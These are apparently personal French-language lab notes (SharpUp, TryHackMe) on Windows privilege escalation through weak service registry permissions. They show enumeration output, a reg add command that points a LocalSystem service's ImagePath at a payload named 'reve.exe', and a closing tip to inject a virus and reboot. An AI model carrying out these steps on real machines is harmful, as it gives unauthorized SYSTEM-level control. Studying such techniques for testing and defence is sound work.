Les autorisations de registre faibles représentent une vulnérabilité dans le registre Windows résultant de contrôles d'accès mal configurés. Ce problème concerne des clés ou des entrées de registre spécifiques dont les autorisations permettent à des utilisateurs non autorisés de manipuler ou d'accéder à des configurations cruciales du système. Cette vulnérabilité peut être exploitée par des attaquants qui injectent du code malveillant dans les clés de registre, obtenant ainsi un accès privilégié non autorisé.


## Recon

```console
C:\Users\bloman\AppData\Local\Temp>.\sharpup.exe audit ModifiableServiceRegistryKeys 
.\sharpup.exe audit ModifiableServiceRegistryKeys 

=== SharpUp: Running Privilege Escalation Checks ===

[*] In medium integrity but user is a local administrator- UAC can be bypassed.

[*] Audit mode: running an additional 1 check(s).

=== Services with Modifiable Registry Keys ===
	Service 'Vulnerable Service 4' (State: Stopped, StartMode: Auto) : SYSTEM\CurrentControlSet\Services\Vulnerable Service 4



[*] Completed Privesc Checks in 1 seconds
C:\Users\bloman\AppData\Local\Temp>
```

- Avec la commande suivante, nous demandons le chemin d'accès à l'image pour le service.

``reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service 4``


```console
C:\Users\bloman\AppData\Local\Temp>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service 4" /t REG_EXPAND_SZ /v ImagePath /d "%temp%/reve.exe" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service 4" /t REG_EXPAND_SZ /v ImagePath /d "%temp%/reve.exe" /f
The operation completed successfully.

C:\Users\bloman\AppData\Local\Temp>
```

avant de demarrer mon service je vais d'abord voir toutes les services dispo:

``sc query state= all``

```console
C:\Users\bloman\AppData\Local\Temp>sc qc "Vulnerable Service 4"
sc qc "Vulnerable Service 4"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Vulnerable Service 4
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\bloman\AppData\Local\Temp/reve.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Vuln Service 4
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

C:\Users\bloman\AppData\Local\Temp>


```


## Practice TryHackMe

```console
C:\Users\user\AppData\Local\Temp>sharpup.exe audit ModifiableServiceRegistryKeys
sharpup.exe audit ModifiableServiceRegistryKeys

=== SharpUp: Running Privilege Escalation Checks ===

=== Services with Modifiable Registry Keys ===
	Service 'regsvc' (State: Stopped, StartMode: Manual) : SYSTEM\CurrentControlSet\Services\regsvc



[*] Completed Privesc Checks in 4 seconds

C:\Users\user\AppData\Local\Temp>sc qc "regsvc"
sc qc "regsvc"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

C:\Users\user\AppData\Local\Temp>

```



```console
=== Services with Modifiable Registry Keys ===
        Service 'Vulnerable Service 4' (State: Stopped, StartMode: Auto) : SYSTEM\CurrentControlSet\Services\Vulnerable Service 4
```


si le `Seshutdown` est disabled. juste injecte ton virus et restart la machine avec 

``shutdown /r /t 0``